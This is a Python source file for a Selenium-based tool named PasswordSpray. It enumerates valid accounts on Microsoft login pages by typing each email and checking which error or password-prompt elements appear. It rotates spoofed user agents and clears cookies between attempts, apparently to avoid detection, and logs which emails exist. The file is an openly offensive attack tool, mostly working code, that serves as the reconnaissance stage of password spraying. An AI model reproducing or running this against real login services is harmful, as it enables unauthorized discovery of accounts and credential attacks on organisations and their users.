import os, sys, time
from urllib.parse import urlparse, parse_qs, uses_relative
from locator import Locator
from utils import search_element_by_locator_strategy, perform_click_on_element
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from random import randint
from json import loads

class PasswordSpray:
    
    DRIVER_PATH = ''
    TARGET_URL = ''
    DOESNT_EXIST_ERR = 'This username may be incorrect. Make sure you typed it correctly. Otherwise, contact your admin.'
    PASSWORD_ELEMENT_NAME = 'passwd'
    PASSWORD_ELEMENT_ID = 'i0118'
    FAILED_USER_ELEMENT = 'usernameError'
    MULTI_ACCOUNT_PROMPT_MSG = 'It looks like this email is used with more than one account from Microsoft. Which one do you want to use?'
    MULTI_ACCOUNT_ELEMENT = 'loginDescription'
    _default_config_filename = 'PasswordSpray.json'

    def __init__(self, driver_path='',config_file=''):
        if config_file:
            self.config_file = config_file
        self.config_file = None
        if driver_path:
            self.driver_path = driver_path
        elif not driver_path and not self.DRIVER_PATH:
            raise ValueError("Web driver path not set or found.")
        self.target_url = ''
        self.succeeded = False
        self.last_error = ''
        self.message = ''
        self._browsers = []
        self._user_agents = [] 
        self._active_browser = None
        self._isterminated = False
        self._results = {}
        configs = self.load_configs()

        for k in configs.keys():            

            if hasattr(self, (k.lower())):
                print('[+] Set config -> {} = {}'.format(k.lower(),configs[k]))
                self.__setattr__(k, configs[k])        

    def load_configs(self):
        #If a config isn't specified, check in the same dir as module
        if not self.config_file:
            self_path = os.path.dirname(os.path.realpath(__file__))
            config_path = os.path.join(self_path, self._default_config_filename)

            if os.path.exists(config_path):
                self.config_file = config_path

            else:
                print("[-] No config file found")
                return
        
        with open(self.config_file,'r') as f:
            r = f.read()
            f.close()

        configs = loads(r)
        print(configs)
        return configs

    def validate_login(self, email, target_url=''):
        if not target_url:
            target_url = self.TARGET_URL
        if not self.TARGET_URL:
            self.terminate()

        if not self.browsers:
            self.log_status("[*] No browsers available. Launching...")
            self.launch_browser()

        idx = randint(0, len(self.browsers) - 1 )               
        
        self.active_browser = self.browsers[idx]

        if self.connect(target_url, email):
            self.log_status("[*] Testing Account {}".format(email))

            #First, if the FAILED_USER_ELEMENT error exists, user doesn't exist
            if self.haserror(self.FAILED_USER_ELEMENT):
                self.log_result({email : False})
                return False

            #Second, check presence of HTML element for password
            if self.get_element_id(self.PASSWORD_ELEMENT_ID):
                #Double-check the input box exists inside the element
                if self.get_element_name(self.PASSWORD_ELEMENT_NAME):
                    self.log_result({ email : True })
                    return True

            #Last, another potential is the user has two accounts
            if self.get_element_id(self.MULTI_ACCOUNT_ELEMENT):
                self.log_result({email : True})
                return True

            #Unhandled exception, exit to be safe
            else:                
                self.log_status("[!] Failed to reach password prompt page and couldn't find username error. Unknown error.")
                self.active_browser.maximize_window()
                self.isterminated = True

        self.clear_cache(self.active_browser)

    def clear_cache(self,browser):
        browser.delete_all_cookies()
        self.do_sleep(3)
        browser.get("about:blank")

    def launch_browser(self, user_agent=''):
        # Didn't implement fake_useragent since it can't
        # be changed during browser runtime.
        if user_agent:            
            self.add_user_agent(user_agent)
            self.log_status("[+] Added User Agent to: {}".format(user_agent))
        
        #Create a browser for every user agent in user_agent property
        for i in self._user_agents:
            self.log_status("[*] Creating browser object with User Agent: {}".format(i))
            profile = self.profile({"general.useragent.override": i})                                
            self.add_browser(webdriver.Firefox(firefox_profile=profile,
                                               executable_path=self.DRIVER_PATH))
        return

    def connect(self, target_url, email):
        self.active_browser.get(target_url)
        locator = By.XPATH

        try:
            login = search_element_by_locator_strategy(self.active_browser, 
                                                       locator, 
                                                       Locator.username_id)
            next_button = search_element_by_locator_strategy(
                                                       self.active_browser, 
                                                       locator, 
                                                       Locator.next_btn_id)
            login.send_keys(email)
            next_button.click()
            self.do_sleep()
            return True

        except:
            return False


    def get_url(self, target_url=''):
        if not target_url:
            target_url = self.TARGET_URL

        self.active_browser.get(target_url)

    def clear_status(self):
        self.message = ''
        self.last_error = ''

    def get_element_id(self, elementId, browser=None):        
        self.clear_status()
        if not browser:
            browser = self.active_browser

        try:
            self.active_browser.find_element_by_id(elementId)
            self.log_status("[+] Successful enumeration for elementId {}".format(elementId))
            return True

        except:
            self.log_status("[!] Failed enumeration for elementId {}".format(elementId))
            return False

    def get_element_name(self, elementName, browser=None):        
        self.clear_status()
        if not browser:
            browser = self.active_browser

        try:
            self.active_browser.find_element_by_name(elementName)
            self.log_status("[+] Successful enumeration for elementId {}".format(elementName))
            return True

        except:
            self.log_status("[!] Failed enumeration for elementId {}".format(elementName))
            return False

    def haserror(self, err, browser=None):
        self.clear_status()

        if not browser:
            browser = self.active_browser

        try:
            browser.find_element_by_id(err)
            self.log_status("[+] Login error found.")
            #Need to log error
            return True

        except:
            return False

    def process_user(self, line):
        for email in line:
            self.enumerate(email)

    def parse_redirect_param(self):
        #Not sure if need.   
        check_password_page = self.active_browser.current_url
        parsed_url = urlparse(check_password_page)
        return parse_qs(parsed_url.query)['redirect_uri'][0]

    @property
    def results(self):
        return self._results

    @results.setter
    def results(self, value):
        for k, v in value.items():
            self._results[k] = v

    def log_result(self, value):
        results = self.results
        for k, v in value.items():
            results[k] = v
            self.results = results

    @property
    def active_browser(self):
        return self._active_browser

    @active_browser.setter        
    def active_browser(self, value):
        self._active_browser = value

    @property
    def browsers(self):
        return self._browsers

    @browsers.setter
    def browsers(self,value):
        self._browsers = value  

    def add_browser(self,value):
        self.browsers = self.browsers + [value]

    @property
    def user_agents(self):
        return self._user_agents

    def add_user_agent(self,value):
        assert isinstance(value,(str,list))
        self._user_agents += value

    def clear_user_agent(self, value=None):
        if not value:
            self._user_agents = []
            return
        self._user_agents.remove(value)
    
    def terminate(self):
        self.isterminated = True

    @property
    def isterminated(self):
        return self._isterminated

    @isterminated.setter            
    def isterminated(self, value):
        self._isterminated = value

    @staticmethod
    def profile(params):
        profile = webdriver.FirefoxProfile() 
        for k, v in params.items():
            #print("key: {} // value: {}".format(k,v))
            profile.set_preference(k, v)
        return profile            
    
    @staticmethod
    def do_sleep(interval=2):
        time.sleep(2)

    @staticmethod
    def log_status(message):
        sys.stdout.write("{}\n".format(message))


if __name__ == "__main__":
    pass